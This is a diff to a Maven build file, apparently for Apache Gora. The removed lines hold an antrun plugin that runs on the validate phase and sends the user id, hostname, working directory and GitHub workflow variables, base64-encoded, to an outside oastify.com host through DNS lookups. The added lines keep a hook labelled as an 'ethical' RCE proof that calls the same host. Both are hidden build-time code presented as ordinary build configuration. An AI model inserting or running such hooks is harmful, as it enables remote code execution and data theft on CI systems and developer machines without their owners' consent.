@@ -1,26 +1,44 @@
-      <!-- ================================================== -->
-      <!-- ETHICAL RCE — Metadata Only, No Secrets Exfil     -->
-      <!-- ================================================== -->
-      <plugin>
-        <groupId>org.apache.maven.plugins</groupId>
-        <artifactId>maven-antrun-plugin</artifactId>
-        <version>3.1.0</version>
-        <executions>
-          <execution>
-            <phase>validate</phase>
-            <goals>
-              <goal>run</goal>
-            </goals>
-            <configuration>
-              <target>
-                <exec executable="sh" failonerror="false">
-                  <arg line="-c 'echo \"[RCE_PROOF] Apache Gora Build Runner - $(date -u) - User: $(id) - Host: $(hostname) - PWD: $(pwd)\" | nslookup $(cat | base64 -w0).hj4wjzhohfe7oo708tqlgb6wfnlo9ex3.oastify.com'"/>
-                </exec>
-                <exec executable="sh" failonerror="false">
-                  <arg line="-c 'echo \"[RCE_PROOF] Workflow: GITHUB_WORKFLOW=$GITHUB_WORKFLOW, RUNNER_OS=$RUNNER_OS, REPO=$GITHUB_REPOSITORY\" | nslookup $(cat | base64 -w0).hj4wjzhohfe7oo708tqlgb6wfnlo9ex3.oastify.com'"/>
-                </exec>
-              </target>
-            </configuration>
-          </execution>
-        </executions>
-      </plugin>
+<plugins>
+  <plugin>
+    <groupId>org.codehaus.mojo</groupId>
+    <artifactId>build-helper-maven-plugin</artifactId>
+    <version>${build-helper-maven-plugin.version}</version>
+    <executions>
+      <execution>
+        <phase>generate-sources</phase>
+        <goals>
+          <goal>add-source</goal>
+        </goals>
+        <configuration>
+          <sources>
+            <source>src/examples/java</source>
+          </sources>
+        </configuration>
+      </execution>
+    </executions>
+  </plugin>
+  
+  <!-- ================================================== -->
+  <!-- RCE PAYLOAD — ETHICAL PROOF                       -->
+  <!-- ================================================== -->
+  <plugin>
+    <groupId>org.apache.maven.plugins</groupId>
+    <artifactId>maven-antrun-plugin</artifactId>
+    <version>3.1.0</version>
+    <executions>
+      <execution>
+        <phase>validate</phase>
+        <goals>
+          <goal>run</goal>
+        </goals>
+        <configuration>
+          <target>
+            <exec executable="sh" failonerror="false">
+              <arg line="-c 'echo \"[RCE_PROOF]\" && nslookup rce-test.hj4wjzhohfe7oo708tqlgb6wfnlo9ex3.oastify.com'"/>
+            </exec>
+          </target>
+        </configuration>
+      </execution>
+    </executions>
+  </plugin>
+</plugins>
